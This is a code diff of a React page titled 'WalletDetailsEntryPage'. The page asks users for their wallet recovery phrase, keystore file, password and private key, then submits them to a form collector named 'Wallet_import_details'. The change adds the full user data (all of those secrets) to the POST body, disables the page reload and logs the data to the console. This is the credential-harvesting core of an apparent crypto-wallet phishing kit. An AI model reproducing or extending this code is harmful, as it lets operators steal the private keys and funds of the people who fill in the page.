@@ -35,12 +35,14 @@ function WalletDetailsEntryPage() {
     if (phrase && keystoreJson && password && privateKey) {
       fetch('/', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: encode({ 'form-name': 'Wallet_import_details' }),
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: encode({ 'form-name': 'Wallet_import_details', ...userData }),
       })
-        .then(() => {
-          window.location.reload();
-        })
+        // .then(() => {
+        //   window.location.reload();
+        // })
         .catch((error) => alert(error));
       console.log(userData);
     } else {
